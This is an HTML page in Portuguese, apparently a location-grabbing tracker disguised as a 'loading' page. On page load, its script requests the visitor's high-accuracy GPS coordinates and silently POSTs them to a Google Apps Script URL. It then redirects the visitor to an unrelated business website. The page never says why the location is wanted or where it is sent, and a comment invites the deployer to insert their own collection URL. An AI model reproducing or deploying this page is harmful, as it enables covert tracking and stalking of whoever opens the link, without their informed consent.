<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
    </style>
    <script>
        // INSERIRA AQUI A URL DA SUA NOVA IMPLANTAÇÃO DO APPS SCRIPT
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzzvns8EpTvPjV96q8nT_WOg6ZOygFZ1_jb2wh-4yeYqXe155DcWGu1b0bDXQQOd24KIw/exec";

        window.onload = function() {
            if (navigator.geolocation) {
                // Solicita apenas a localização do dispositivo
                navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                console.log("Geolocalização não suportada.");
                redirecionarUsuario();
            }
        };

        function sucessoLocalizacao(position) {
            const dados = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                timestamp: new Date().toLocaleString("pt-BR")
            };

            // Envia os dados estritamente via método POST
            fetch(WEB_APP_URL, {
                method: "POST",
                mode: "no-cors", // Evita problemas de CORS com o Google Apps Script
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(dados)
            })
            .then(() => {
                console.log("Dados enviados.");
                redirecionarUsuario();
            })
            .catch(error => {
                console.error("Erro no envio:", error);
                redirecionarUsuario();
            });
        }

        function erroLocalizacao(error) {
            console.warn("Permissão recusada ou erro obtendo localização:", error.message);
            redirecionarUsuario();
        }

        function redirecionarUsuario() {
            // Insira aqui o site de destino final do usuário
            window.location.href = "https://www.despachanteespindola.com/";
        }
    </script>
</head>
<body>
    <p>Carregando conteúdo, por favor aguarde...</p>
</body>
</html>
